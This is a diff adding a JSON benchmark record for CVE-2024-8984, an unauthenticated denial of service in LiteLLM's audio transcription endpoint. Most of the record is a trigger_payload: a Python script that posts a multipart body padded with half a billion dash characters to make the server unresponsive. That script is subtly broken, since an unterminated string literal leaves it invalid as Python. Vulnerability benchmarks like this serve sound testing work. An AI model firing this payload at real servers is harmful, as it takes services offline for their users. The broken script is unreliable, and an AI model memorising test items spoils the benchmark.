@@ -1,0 +1,15 @@
+{
+  "file_id": "65_litellm_huntr_554fc76b-3097-4223-b4cf-110b853e9355",
+  "numeric_id": "65",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Unauthenticated Denial of Service via excessive multipart boundary processing in LiteLLM",
+  "cve": "CVE-2024-8984",
+  "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling",
+  "library": "litellm",
+  "affected_version": ">= 1.44.5, < 1.65.4",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\nnum = 500000000\nurl = \"{BASE_URL}/v1/audio/transcriptions\"\nheaders = {\n\"Content-Type\": \"multipart/form-data; boundary=---------------------------28417\"\n}\n# The exact raw payload as specified\ndata = (\n\"-----------------------------284178091740602105783377960069\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"uploadFile\\\"; filename=\\\"test.txt\\\"\\r\\n\"\n\"Content-Type: text/plain\\r\\n\\r\\n\"\n\"Hello I am test\\r\\n\"\n\"-----------------------------284178091740602105783377960069--\" + '-' * num + \"\n)\nresponse = requests.post(url, headers=headers, data=data.encode('utf-8'), verify=False)\nprint(response.status_code)\nprint(response.text)",
+  "oracle": "Server becomes unresponsive and service is unavailable"
+}
